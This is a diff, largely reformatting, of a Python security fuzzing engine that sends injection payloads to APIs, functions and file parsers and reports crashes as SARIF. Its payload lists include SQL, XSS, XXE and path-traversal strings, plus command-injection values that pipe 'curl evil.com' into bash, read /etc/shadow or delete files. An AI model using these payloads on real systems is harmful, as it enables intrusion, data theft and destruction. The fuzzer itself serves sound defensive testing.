@@ -35,6 +35,7 @@ from urllib.parse import urljoin
 # Import Docker sandbox for safe code execution
 try:
     from sandbox.docker_sandbox import DockerSandbox, SandboxConfig
+
     SANDBOX_AVAILABLE = True
 except ImportError:
     SANDBOX_AVAILABLE = False
@@ -43,6 +44,7 @@ except ImportError:
 # Optional imports with graceful fallback
 try:
     import requests
+
     REQUESTS_AVAILABLE = True
 except ImportError:
     REQUESTS_AVAILABLE = False
@@ -50,21 +52,20 @@ except ImportError:
 
 try:
     import yaml
+
     YAML_AVAILABLE = True
 except ImportError:
     YAML_AVAILABLE = False
     logging.warning("PyYAML not available - OpenAPI parsing may be limited")
 
 # Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-)
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
 
 
 class FuzzTarget(Enum):
     """Type of fuzzing target"""
+
     PYTHON_FUNCTION = "python_function"
     API_ENDPOINT = "api_endpoint"
     FILE_PARSER = "file_parser"
@@ -74,6 +75,7 @@ class FuzzTarget(Enum):
 @dataclass
 class FuzzConfig:
     """Fuzzing configuration"""
+
     target: FuzzTarget
     target_path: str
     duration_seconds: int = 300  # 5 minutes default
@@ -93,6 +95,7 @@ class FuzzConfig:
 @dataclass
 class Crash:
     """Represents a crash found by fuzzing"""
+
     crash_id: str
     input_data: str
     stack_trace: str
@@ -107,6 +110,7 @@ class Crash:
 @dataclass
 class FuzzResult:
     """Results from fuzzing campaign"""
+
     target: str
     duration_seconds: int
     total_iterations: int
@@ -122,8 +126,8 @@ class FuzzResult:
         for crash in self.crashes:
             crash_dict = asdict(crash)
             # Convert sets to lists for JSON serialization
-            if 'metadata' in crash_dict and isinstance(crash_dict['metadata'].get('lines_executed'), set):
-                crash_dict['metadata']['lines_executed'] = list(crash_dict['metadata']['lines_executed'])
+            if "metadata" in crash_dict and isinstance(crash_dict["metadata"].get("lines_executed"), set):
+                crash_dict["metadata"]["lines_executed"] = list(crash_dict["metadata"]["lines_executed"])
             crashes_data.append(crash_dict)
 
         return {
@@ -134,7 +138,7 @@ class FuzzResult:
             "coverage": self.coverage,
             "corpus_size": self.corpus_size,
             "unique_crashes": self.unique_crashes,
-            "executions_per_second": self.executions_per_second
+            "executions_per_second": self.executions_per_second,
         }
 
 
@@ -144,75 +148,125 @@ class FuzzingEngine:
     # Common injection payloads by vulnerability type
     INJECTION_PAYLOADS = {
         "sql_injection": [
-            "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--",
-            "admin'--", "1' AND '1'='1", "1' OR '1'='1' --",
-            "' OR 1=1--", "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
-            "1' UNION SELECT NULL, username, password FROM users--"
+            "' OR '1'='1",
+            "1; DROP TABLE users--",
+            "' UNION SELECT NULL--",
+            "admin'--",
+            "1' AND '1'='1",
+            "1' OR '1'='1' --",
+            "' OR 1=1--",
+            "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
+            "1' UNION SELECT NULL, username, password FROM users--",
         ],
         "xss": [
-            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-            "javascript:alert(1)", "<svg onload=alert(1)>",
-            "'><script>alert(1)</script>", "<iframe src='javascript:alert(1)'>",
-            "<body onload=alert(1)>", "<<SCRIPT>alert(1);//<</SCRIPT>"
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "<svg onload=alert(1)>",
+            "'><script>alert(1)</script>",
+            "<iframe src='javascript:alert(1)'>",
+            "<body onload=alert(1)>",
+            "<<SCRIPT>alert(1);//<</SCRIPT>",
         ],
         "command_injection": [
-            "; ls -la", "| cat /etc/passwd", "`whoami`",
-            "$(curl evil.com)", "; curl evil.com | bash",
-            "&& cat /etc/shadow", "|| id", "; rm -rf /tmp/*"
+            "; ls -la",
+            "| cat /etc/passwd",
+            "`whoami`",
+            "$(curl evil.com)",
+            "; curl evil.com | bash",
+            "&& cat /etc/shadow",
+            "|| id",
+            "; rm -rf /tmp/*",
         ],
         "path_traversal": [
-            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
-            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%252f..%252f..%252fetc%252fpasswd", "....\\\\....\\\\....\\\\windows\\\\win.ini"
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "....\\\\....\\\\....\\\\windows\\\\win.ini",
         ],
         "xxe": [
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>'
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
         ],
-        "buffer_overflow": [
-            "A" * 1000, "A" * 10000, "A" * 100000,
-            "\x00" * 1000, "\xff" * 1000, "\x41" * 65536
-        ],
+        "buffer_overflow": ["A" * 1000, "A" * 10000, "A" * 100000, "\x00" * 1000, "\xff" * 1000, "\x41" * 65536],
         "integer_overflow": [
-            "2147483647", "-2147483648", "9223372036854775807",
-            "18446744073709551615", "-9223372036854775808"
+            "2147483647",
+            "-2147483648",
+            "9223372036854775807",
+            "18446744073709551615",
+            "-9223372036854775808",
         ],
-        "format_string": [
-            "%s%s%s%s%s%s%s%s%s", "%x%x%x%x%x%x", "%n%n%n%n",
-            "%p%p%p%p", "%.1000000s", "%999999d"
-        ],
+        "format_string": ["%s%s%s%s%s%s%s%s%s", "%x%x%x%x%x%x", "%n%n%n%n", "%p%p%p%p", "%.1000000s", "%999999d"],
         "ldap_injection": [
-            "*)(uid=*))(|(uid=*", "admin)(&)", "*()|&'",
-            "*)(objectClass=*", "admin*", "*)(userPassword=*"
+            "*)(uid=*))(|(uid=*",
+            "admin)(&)",
+            "*()|&'",
+            "*)(objectClass=*",
+            "admin*",
+            "*)(userPassword=*",
         ],
         "nosql_injection": [
-            '{"$gt":""}', '{"$ne":null}', '{"$where":"1==1"}',
-            '{"$regex":".*"}', '{"username":{"$ne":"invalid"}}'
-        ]
+            '{"$gt":""}',
+            '{"$ne":null}',
+            '{"$where":"1==1"}',
+            '{"$regex":".*"}',
+            '{"username":{"$ne":"invalid"}}',
+        ],
     }
 
     # Edge case payloads
     EDGE_CASES = [
         # Empty/null
-        "", "null", "undefined", "None", "NULL", "nil",
+        "",
+        "null",
+        "undefined",
+        "None",
+        "NULL",
+        "nil",
         # Boolean
-        "true", "false", "True", "False", "TRUE", "FALSE",
+        "true",
+        "false",
+        "True",
+        "False",
+        "TRUE",
+        "FALSE",
         # Numbers
-        "0", "-1", "999999999", "-999999999",
+        "0",
+        "-1",
+        "999999999",
+        "-999999999",
         "1.7976931348623157e+308",  # Max float
         "2.2250738585072014e-308",  # Min float
         # Special characters
-        "\x00", "\x00\x00\x00", "\n" * 100, "\r\n" * 100,
-        " " * 1000, "\t" * 100,
+        "\x00",
+        "\x00\x00\x00",
+        "\n" * 100,
+        "\r\n" * 100,
+        " " * 1000,
+        "\t" * 100,
         # Unicode
-        "🔥" * 100, "你好世界", "مرحبا", "שלום",
+        "🔥" * 100,
+        "你好世界",
+        "مرحبا",
+        "שלום",
         # JSON/XML
-        "[]", "{}", "<>", "<?xml version='1.0'?>",
+        "[]",
+        "{}",
+        "<>",
+        "<?xml version='1.0'?>",
         # Array payloads
-        "['test']", '["test"]', "{test: 'value'}",
+        "['test']",
+        '["test"]',
+        "{test: 'value'}",
         # Special values
-        "NaN", "Infinity", "-Infinity", "1e308", "-1e308"
+        "NaN",
+        "Infinity",
+        "-Infinity",
+        "1e308",
+        "-1e308",
     ]
 
     # CWE mapping for crash types
@@ -232,7 +286,7 @@ class FuzzingEngine:
         "timeout": "CWE-400",
         "exception": "CWE-703",
         "assertion": "CWE-617",
-        "asan": "CWE-119"
+        "asan": "CWE-119",
     }
 
     def __init__(self, llm_manager=None, config: Optional[FuzzConfig] = None):
@@ -248,6 +302,7 @@ class FuzzingEngine:
                 # Import LLMManager from orchestrator
                 sys.path.insert(0, str(Path(__file__).parent))
                 from orchestrator.llm_manager import LLMManager
+
                 self.llm = LLMManager()
                 logger.info("LLMManager initialized for AI-guided fuzzing")
             except Exception as e:
@@ -259,10 +314,7 @@ class FuzzingEngine:
         # Initialize Docker sandbox if enabled
         if self.config and self.config.use_sandbox:
             if not SANDBOX_AVAILABLE:
-                logger.warning(
-                    "Sandbox requested but not available. "
-                    "Install Docker support with: pip install docker"
-                )
+                logger.warning("Sandbox requested but not available. Install Docker support with: pip install docker")
                 logger.warning("Falling back to UNSAFE direct execution")
             else:
                 try:
@@ -270,7 +322,7 @@ class FuzzingEngine:
                         cpu_limit=self.config.sandbox_cpu_limit,
                         memory_limit=self.config.sandbox_memory_limit,
                         timeout=self.config.timeout_seconds,
-                        network_disabled=True
+                        network_disabled=True,
                     )
                     self.sandbox = DockerSandbox(config=sandbox_config)
                     logger.info(
@@ -283,8 +335,9 @@ class FuzzingEngine:
                     logger.warning("Falling back to UNSAFE direct execution")
                     self.sandbox = None
 
-    def fuzz_api(self, openapi_spec: str, duration_minutes: int = 60,
-                 base_url: str = None, verify_ssl: bool = True) -> FuzzResult:
+    def fuzz_api(
+        self, openapi_spec: str, duration_minutes: int = 60, base_url: str = None, verify_ssl: bool = True
+    ) -> FuzzResult:
         """
         Fuzz all API endpoints from OpenAPI spec
 
@@ -355,11 +408,16 @@ class FuzzingEngine:
             coverage=0.0,  # API fuzzing doesn't track code coverage
             corpus_size=len(test_cases),
             unique_crashes=len(unique_crashes),
-            executions_per_second=exec_per_sec
+            executions_per_second=exec_per_sec,
         )
 
-    def fuzz_function(self, function_path: str, function_name: str,
-                     duration_minutes: int = 30, sast_findings: Optional[list[dict]] = None) -> FuzzResult:
+    def fuzz_function(
+        self,
+        function_path: str,
+        function_name: str,
+        duration_minutes: int = 30,
+        sast_findings: Optional[list[dict]] = None,
+    ) -> FuzzResult:
         """
         Fuzz a specific Python function with AI-generated inputs
 
@@ -431,11 +489,12 @@ class FuzzingEngine:
             coverage=coverage,
             corpus_size=len(test_cases),
             unique_crashes=len(unique_crashes),
-            executions_per_second=exec_per_sec
+            executions_per_second=exec_per_sec,
         )
 
-    def fuzz_file_parser(self, parser_path: str, parser_function: str,
-                        file_type: str, duration_minutes: int = 30) -> FuzzResult:
+    def fuzz_file_parser(
+        self, parser_path: str, parser_function: str, file_type: str, duration_minutes: int = 30
+    ) -> FuzzResult:
         """
         Fuzz file parser with malformed files
 
@@ -490,11 +549,10 @@ class FuzzingEngine:
             coverage=0.0,
             corpus_size=len(test_files),
             unique_crashes=len(unique_crashes),
-            executions_per_second=exec_per_sec
+            executions_per_second=exec_per_sec,
         )
 
-    def generate_test_cases(self, function_signature: str,
-                           sast_findings: Optional[list[dict]] = None) -> list[Any]:
+    def generate_test_cases(self, function_signature: str, sast_findings: Optional[list[dict]] = None) -> list[Any]:
         """
         Use LLM to generate edge-case inputs
 
@@ -541,7 +599,7 @@ No explanations, just the JSON array."""
             response, _ = self.llm.call_llm_api(prompt, max_tokens=3000)
 
             # Extract JSON array from response
-            json_match = re.search(r'\[.*\]', response, re.DOTALL)
+            json_match = re.search(r"\[.*\]", response, re.DOTALL)
             if json_match:
                 test_cases = json.loads(json_match.group(0))
                 logger.info(f"Generated {len(test_cases)} AI test cases")
@@ -589,7 +647,7 @@ No explanations, just the JSON array."""
 
         # Load spec
         with open(spec_path) as f:
-            if spec_path.suffix in ['.yaml', '.yml']:
+            if spec_path.suffix in [".yaml", ".yml"]:
                 if not YAML_AVAILABLE:
                     raise RuntimeError("PyYAML required for YAML specs")
                 spec = yaml.safe_load(f)
@@ -598,32 +656,32 @@ No explanations, just the JSON array."""
 
         # Extract base URL
         if not base_url:
-            if 'servers' in spec and spec['servers']:
-                base_url = spec['servers'][0]['url']
-            elif 'host' in spec:
+            if "servers" in spec and spec["servers"]:
+                base_url = spec["servers"][0]["url"]
+            elif "host" in spec:
                 # Swagger 2.0
-                scheme = spec.get('schemes', ['https'])[0]
+                scheme = spec.get("schemes", ["https"])[0]
                 base_url = f"{scheme}://{spec['host']}{spec.get('basePath', '')}"
             else:
                 base_url = "http://localhost"
 
         # Extract endpoints
         endpoints = []
-        paths = spec.get('paths', {})
+        paths = spec.get("paths", {})
 
         for path, path_item in paths.items():
             for method, operation in path_item.items():
-                if method.upper() not in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
+                if method.upper() not in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
                     continue
 
                 endpoint = {
-                    'path': path,
-                    'method': method.upper(),
-                    'base_url': base_url,
-                    'parameters': operation.get('parameters', []),
-                    'requestBody': operation.get('requestBody', {}),
-                    'summary': operation.get('summary', ''),
-                    'operationId': operation.get('operationId', f"{method}_{path}")
+                    "path": path,
+                    "method": method.upper(),
+                    "base_url": base_url,
+                    "parameters": operation.get("parameters", []),
+                    "requestBody": operation.get("requestBody", {}),
+                    "summary": operation.get("summary", ""),
+                    "operationId": operation.get("operationId", f"{method}_{path}"),
                 }
                 endpoints.append(endpoint)
 
@@ -641,50 +699,50 @@ No explanations, just the JSON array."""
         """
         test_cases = []
         base_test = {
-            'url': urljoin(endpoint['base_url'], endpoint['path']),
-            'method': endpoint['method'],
-            'headers': {'Content-Type': 'application/json'},
-            'params': {},
-            'json': {},
-            'data': None
+            "url": urljoin(endpoint["base_url"], endpoint["path"]),
+            "method": endpoint["method"],
+            "headers": {"Content-Type": "application/json"},
+            "params": {},
+            "json": {},
+            "data": None,
         }
 
         # Generate tests for parameters
-        for param in endpoint.get('parameters', []):
-            param_name = param.get('name')
-            param_in = param.get('in')  # query, header, path, cookie
+        for param in endpoint.get("parameters", []):
+            param_name = param.get("name")
+            param_in = param.get("in")  # query, header, path, cookie
 
             # Generate malicious values for this parameter
             for payload_type, payloads in self.INJECTION_PAYLOADS.items():
                 for payload in payloads[:3]:  # Limit to 3 per type
                     test = base_test.copy()
-                    test['params'] = test['params'].copy()
-                    test['headers'] = test['headers'].copy()
+                    test["params"] = test["params"].copy()
+                    test["headers"] = test["headers"].copy()
 
-                    if param_in == 'query':
-                        test['params'][param_name] = payload
-                    elif param_in == 'header':
-                        test['headers'][param_name] = payload
-                    elif param_in == 'path':
-                        test['url'] = test['url'].replace(f'{{{param_name}}}', str(payload))
+                    if param_in == "query":
+                        test["params"][param_name] = payload
+                    elif param_in == "header":
+                        test["headers"][param_name] = payload
+                    elif param_in == "path":
+                        test["url"] = test["url"].replace(f"{{{param_name}}}", str(payload))
 
-                    test['payload_type'] = payload_type
+                    test["payload_type"] = payload_type
                     test_cases.append(test)
 
         # Generate tests for request body
-        if endpoint.get('requestBody'):
+        if endpoint.get("requestBody"):
             for payload_type, payloads in self.INJECTION_PAYLOADS.items():
                 for payload in payloads[:3]:
                     test = base_test.copy()
-                    test['json'] = {'test': payload}
-                    test['payload_type'] = payload_type
+                    test["json"] = {"test": payload}
+                    test["payload_type"] = payload_type
                     test_cases.append(test)
 
         # Add edge cases
         for edge_case in self.EDGE_CASES[:20]:
             test = base_test.copy()
-            test['params'] = {'test': edge_case}
-            test['payload_type'] = 'edge_case'
+            test["params"] = {"test": edge_case}
+            test["payload_type"] = "edge_case"
             test_cases.append(test)
 
         return test_cases
@@ -700,55 +758,49 @@ No explanations, just the JSON array."""
         Returns:
             Result dictionary with crash info
         """
-        result = {
-            'crashed': False,
-            'crash_type': None,
-            'stack_trace': '',
-            'response_code': None,
-            'response_time': 0
-        }
+        result = {"crashed": False, "crash_type": None, "stack_trace": "", "response_code": None, "response_time": 0}
 
         try:
             start = time.time()
 
             response = requests.request(
-                method=test_case['method'],
-                url=test_case['url'],
-                headers=test_case.get('headers', {}),
-                params=test_case.get('params', {}),
-                json=test_case.get('json'),
-                data=test_case.get('data'),
+                method=test_case["method"],
+                url=test_case["url"],
+                headers=test_case.get("headers", {}),
+                params=test_case.get("params", {}),
+                json=test_case.get("json"),
+                data=test_case.get("data"),
                 timeout=self.config.timeout_seconds if self.config else 5,
-                verify=verify_ssl
+                verify=verify_ssl,
             )
 
-            result['response_time'] = time.time() - start
-            result['response_code'] = response.status_code
+            result["response_time"] = time.time() - start
+            result["response_code"] = response.status_code
 
             # Detect crashes/errors
             if response.status_code >= 500:
-                result['crashed'] = True
-                result['crash_type'] = 'server_error'
-                result['stack_trace'] = response.text[:1000]
-            elif response.status_code == 400 and 'error' in response.text.lower():
+                result["crashed"] = True
+                result["crash_type"] = "server_error"
+                result["stack_trace"] = response.text[:1000]
+            elif response.status_code == 400 and "error" in response.text.lower():
                 # Some 400s indicate parsing errors
-                if any(err in response.text.lower() for err in ['exception', 'stack trace', 'error']):
-                    result['crashed'] = True
-                    result['crash_type'] = 'parse_error'
-                    result['stack_trace'] = response.text[:1000]
+                if any(err in response.text.lower() for err in ["exception", "stack trace", "error"]):
+                    result["crashed"] = True
+                    result["crash_type"] = "parse_error"
+                    result["stack_trace"] = response.text[:1000]
 
         except requests.exceptions.Timeout:
-            result['crashed'] = True
-            result['crash_type'] = 'timeout'
-            result['stack_trace'] = f"Request timeout after {self.config.timeout_seconds if self.config else 5}s"
+            result["crashed"] = True
+            result["crash_type"] = "timeout"
+            result["stack_trace"] = f"Request timeout after {self.config.timeout_seconds if self.config else 5}s"
         except requests.exceptions.ConnectionError as e:
-            result['crashed'] = True
-            result['crash_type'] = 'connection_error'
-            result['stack_trace'] = str(e)
+            result["crashed"] = True
+            result["crash_type"] = "connection_error"
+            result["stack_trace"] = str(e)
         except Exception:
-            result['crashed'] = True
-            result['crash_type'] = 'exception'
-            result['stack_trace'] = traceback.format_exc()
+            result["crashed"] = True
+            result["crash_type"] = "exception"
+            result["stack_trace"] = traceback.format_exc()
 
         return result
 
@@ -839,40 +891,27 @@ No explanations, just the JSON array."""
             try:
                 # Execute in isolated Docker container
                 sandbox_result = self.sandbox.execute_python_module(
-                    file_path,
-                    function_name,
-                    test_input,
-                    timeout=self.config.timeout_seconds if self.config else 30
+                    file_path, function_name, test_input, timeout=self.config.timeout_seconds if self.config else 30
                 )
 
                 # Convert sandbox result to expected format
                 result = {
-                    'crashed': sandbox_result.crashed,
-                    'crash_type': sandbox_result.crash_type,
-                    'stack_trace': sandbox_result.stack_trace,
-                    'lines_executed': sandbox_result.lines_executed or set()
+                    "crashed": sandbox_result.crashed,
+                    "crash_type": sandbox_result.crash_type,
+                    "stack_trace": sandbox_result.stack_trace,
+                    "lines_executed": sandbox_result.lines_executed or set(),
                 }
 
                 return result
 
             except Exception as e:
                 logger.error(f"Sandbox execution failed: {e}")
-                return {
-                    'crashed': True,
-                    'crash_type': 'sandbox_error',
-                    'stack_trace': str(e),
-                    'lines_executed': set()
-                }
+                return {"crashed": True, "crash_type": "sandbox_error", "stack_trace": str(e), "lines_executed": set()}
 
         # UNSAFE FALLBACK (NO SANDBOX)
         logger.warning("Executing WITHOUT sandbox - SECURITY RISK!")
 
-        result = {
-            'crashed': False,
-            'crash_type': None,
-            'stack_trace': '',
-            'lines_executed': set()
-        }
+        result = {"crashed": False, "crash_type": None, "stack_trace": "", "lines_executed": set()}
 
         try:
             # Try to call with different input patterns
@@ -886,44 +925,41 @@ No explanations, just the JSON array."""
             else:
                 # Multiple params - try to split input or pass same to all
                 if isinstance(test_input, (list, tuple)):
-                    func(*test_input[:len(params)])  # UNSAFE!
+                    func(*test_input[: len(params)])  # UNSAFE!
                 else:
                     func(*[test_input] * len(params))  # UNSAFE!
 
         except TimeoutError:
-            result['crashed'] = True
-            result['crash_type'] = 'timeout'
-            result['stack_trace'] = "Function execution timeout"
+            result["crashed"] = True
+            result["crash_type"] = "timeout"
+            result["stack_trace"] = "Function execution timeout"
         except AssertionError:
-            result['crashed'] = True
-            result['crash_type'] = 'assertion'
-            result['stack_trace'] = traceback.format_exc()
+            result["crashed"] = True
+            result["crash_type"] = "assertion"
+            result["stack_trace"] = traceback.format_exc()
         except (ValueError, TypeError, KeyError, IndexError, AttributeError) as e:
             # These might be expected for bad inputs, only crash if severe
             if "buffer" in str(e).lower() or "overflow" in str(e).lower():
-                result['crashed'] = True
-                result['crash_type'] = 'exception'
-                result['stack_trace'] = traceback.format_exc()
+                result["crashed"] = True
+                result["crash_type"] = "exception"
+                result["stack_trace"] = traceback.format_exc()
         except Exception:
-            result['crashed'] = True
-            result['crash_type'] = 'exception'
-            result['stack_trace'] = traceback.format_exc()
+            result["crashed"] = True
+            result["crash_type"] = "exception"
+            result["stack_trace"] = traceback.format_exc()
 
         return result
 
     def _execute_parser_test(self, parser_func, test_file: dict) -> dict:
         """Execute parser function with malformed file"""
-        result = {
-            'crashed': False,
-            'crash_type': None,
-            'stack_trace': ''
-        }
+        result = {"crashed": False, "crash_type": None, "stack_trace": ""}
 
         try:
             # Write test file to temp location
             import tempfile
-            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=test_file['ext']) as f:
-                f.write(test_file['content'])
+
+            with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=test_file["ext"]) as f:
+                f.write(test_file["content"])
                 temp_path = f.name
 
             try:
@@ -932,9 +968,9 @@ No explanations, just the JSON array."""
                 Path(temp_path).unlink(missing_ok=True)
 
         except Exception:
-            result['crashed'] = True
-            result['crash_type'] = 'exception'
-            result['stack_trace'] = traceback.format_exc()
+            result["crashed"] = True
+            result["crash_type"] = "exception"
+            result["stack_trace"] = traceback.format_exc()
 
         return result
 
@@ -942,52 +978,49 @@ No explanations, just the JSON array."""
         """Generate malformed files for parser fuzzing"""
         files = []
 
-        if file_type == 'json':
+        if file_type == "json":
             malformed = [
                 '{"key": "value"',  # Missing closing brace
                 '{"key": }',  # Missing value
                 '{key: "value"}',  # Unquoted key
                 '{"key": "value",}',  # Trailing comma
                 '{"key": "\x00"}',  # Null byte
-                '{"key": "' + 'A' * 100000 + '"}',  # Huge value
-                '[' * 1000,  # Deep nesting
+                '{"key": "' + "A" * 100000 + '"}',  # Huge value
+                "[" * 1000,  # Deep nesting
             ]
-        elif file_type == 'xml':
+        elif file_type == "xml":
             malformed = [
-                '<root><child></root>',  # Mismatched tags
-                '<root>' + '<child>' * 10000 + '</root>',  # Billion laughs
+                "<root><child></root>",  # Mismatched tags
+                "<root>" + "<child>" * 10000 + "</root>",  # Billion laughs
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-                '<root>\x00</root>',  # Null byte
+                "<root>\x00</root>",  # Null byte
             ]
-        elif file_type == 'csv':
+        elif file_type == "csv":
             malformed = [
-                'col1,col2\n' + ','.join(['A'] * 10000),  # Too many columns
+                "col1,col2\n" + ",".join(["A"] * 10000),  # Too many columns
                 'col1,col2\n"value\n',  # Unclosed quote
-                '\x00,\x00',  # Null bytes
+                "\x00,\x00",  # Null bytes
             ]
         else:
-            malformed = ['invalid content']
+            malformed = ["invalid content"]
 
         for content in malformed:
-            files.append({
-                'content': content,
-                'ext': f'.{file_type}'
-            })
+            files.append({"content": content, "ext": f".{file_type}"})
 
         return files
 
     def _create_crash_report(self, result: dict, test_input: Any) -> Crash:
         """Create a Crash object from test result"""
-        crash_type = result.get('crash_type', 'unknown')
-        stack_trace = result.get('stack_trace', '')
+        crash_type = result.get("crash_type", "unknown")
+        stack_trace = result.get("stack_trace", "")
 
         # Determine severity
         severity = "medium"
-        if crash_type in ['buffer_overflow', 'use_after_free', 'command_injection']:
+        if crash_type in ["buffer_overflow", "use_after_free", "command_injection"]:
             severity = "critical"
-        elif crash_type in ['exception', 'assertion', 'timeout']:
+        elif crash_type in ["exception", "assertion", "timeout"]:
             severity = "high"
-        elif crash_type in ['parse_error', 'server_error']:
+        elif crash_type in ["parse_error", "server_error"]:
             severity = "medium"
 
         # Map to CWE
@@ -1005,7 +1038,7 @@ No explanations, just the JSON array."""
             reproducible=True,  # Assume reproducible for now
             severity=severity,
             cwe=cwe,
-            metadata=result
+            metadata=result,
         )
 
     def _map_to_cwe(self, crash_type: str, stack_trace: str, test_input: Any) -> str:
@@ -1016,11 +1049,11 @@ No explanations, just the JSON array."""
 
         # Pattern matching in stack trace
         stack_lower = stack_trace.lower()
-        if 'null' in stack_lower or 'nonetype' in stack_lower:
+        if "null" in stack_lower or "nonetype" in stack_lower:
             return "CWE-476"  # Null pointer
-        elif 'overflow' in stack_lower:
+        elif "overflow" in stack_lower:
             return "CWE-119"  # Buffer overflow
-        elif 'memory' in stack_lower:
+        elif "memory" in stack_lower:
             return "CWE-401"  # Memory leak
 
         # Analyze test input
@@ -1047,9 +1080,9 @@ No explanations, just the JSON array."""
         for crash in crashes:
             # Create fingerprint from stack trace (normalized)
             # Remove line numbers and addresses for better grouping
-            normalized = re.sub(r'line \d+', 'line X', crash.stack_trace)
-            normalized = re.sub(r'0x[0-9a-fA-F]+', '0xXXX', normalized)
-            normalized = re.sub(r'\d+', 'N', normalized)
+            normalized = re.sub(r"line \d+", "line X", crash.stack_trace)
+            normalized = re.sub(r"0x[0-9a-fA-F]+", "0xXXX", normalized)
+            normalized = re.sub(r"\d+", "N", normalized)
 
             fingerprint = hashlib.sha256(normalized.encode()).hexdigest()
 
@@ -1068,7 +1101,7 @@ No explanations, just the JSON array."""
         try:
             # Count total lines in file
             with open(file_path) as f:
-                total_lines = sum(1 for line in f if line.strip() and not line.strip().startswith('#'))
+                total_lines = sum(1 for line in f if line.strip() and not line.strip().startswith("#"))
 
             executed_lines = len(self.coverage_data[file_path])
             return (executed_lines / total_lines * 100) if total_lines > 0 else 0.0
@@ -1077,15 +1110,15 @@ No explanations, just the JSON array."""
 
     def _generate_random_string(self, length: int) -> str:
         """Generate random string for mutation fuzzing"""
-        chars = string.ascii_letters + string.digits + string.punctuation + '\x00\n\r\t'
-        return ''.join(random.choice(chars) for _ in range(length))
+        chars = string.ascii_letters + string.digits + string.punctuation + "\x00\n\r\t"
+        return "".join(random.choice(chars) for _ in range(length))
 
     def save_corpus(self, output_dir: Path):
         """Save fuzzing corpus for future runs"""
         output_dir.mkdir(parents=True, exist_ok=True)
         corpus_file = output_dir / "corpus.json"
 
-        with open(corpus_file, 'w') as f:
+        with open(corpus_file, "w") as f:
             json.dump(self.corpus, f, indent=2)
 
         logger.info(f"Saved {len(self.corpus)} corpus items to {corpus_file}")
@@ -1108,36 +1141,36 @@ No explanations, just the JSON array."""
         sarif = {
             "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
             "version": "2.1.0",
-            "runs": [{
-                "tool": {
-                    "driver": {
-                        "name": "Argus Fuzzing Engine",
-                        "version": "1.0.0",
-                        "informationUri": "https://github.com/devatsecure/Argus-Security"
-                    }
-                },
-                "results": []
-            }]
+            "runs": [
+                {
+                    "tool": {
+                        "driver": {
+                            "name": "Argus Fuzzing Engine",
+                            "version": "1.0.0",
+                            "informationUri": "https://github.com/devatsecure/Argus-Security",
+                        }
+                    },
+                    "results": [],
+                }
+            ],
         }
 
         for crash in crashes:
             result = {
                 "ruleId": crash.cwe or "FUZZ-001",
                 "level": "error" if crash.severity in ["critical", "high"] else "warning",
-                "message": {
-                    "text": f"Fuzzing found {crash.crash_type}: {crash.stack_trace[:200]}"
-                },
+                "message": {"text": f"Fuzzing found {crash.crash_type}: {crash.stack_trace[:200]}"},
                 "properties": {
                     "crash_id": crash.crash_id,
                     "input": crash.input_data[:500],
                     "crash_type": crash.crash_type,
                     "severity": crash.severity,
-                    "reproducible": crash.reproducible
-                }
+                    "reproducible": crash.reproducible,
+                },
             }
             sarif["runs"][0]["results"].append(result)
 
-        with open(output_file, 'w') as f:
+        with open(output_file, "w") as f:
             json.dump(sarif, f, indent=2)
 
         logger.info(f"Exported {len(crashes)} crashes to SARIF: {output_file}")
@@ -1159,36 +1192,36 @@ No explanations, just the JSON array."""
 def main():
     """CLI entry point"""
     parser = argparse.ArgumentParser(description="Argus Intelligent Fuzzing Engine")
-    subparsers = parser.add_subparsers(dest='command', help='Fuzzing command')
+    subparsers = parser.add_subparsers(dest="command", help="Fuzzing command")
 
     # API fuzzing
-    api_parser = subparsers.add_parser('api', help='Fuzz API endpoints')
-    api_parser.add_argument('--spec', required=True, help='OpenAPI spec file')
-    api_parser.add_argument('--duration', type=int, default=60, help='Duration in minutes')
-    api_parser.add_argument('--base-url', help='Base URL override')
-    api_parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL verification')
-    api_parser.add_argument('--output', default='fuzz_results.json', help='Output file')
+    api_parser = subparsers.add_parser("api", help="Fuzz API endpoints")
+    api_parser.add_argument("--spec", required=True, help="OpenAPI spec file")
+    api_parser.add_argument("--duration", type=int, default=60, help="Duration in minutes")
+    api_parser.add_argument("--base-url", help="Base URL override")
+    api_parser.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL verification")
+    api_parser.add_argument("--output", default="fuzz_results.json", help="Output file")
 
     # Function fuzzing
-    func_parser = subparsers.add_parser('function', help='Fuzz Python function')
-    func_parser.add_argument('--target', required=True, help='Path:function (e.g., src/parser.py:parse_xml)')
-    func_parser.add_argument('--duration', type=int, default=30, help='Duration in minutes')
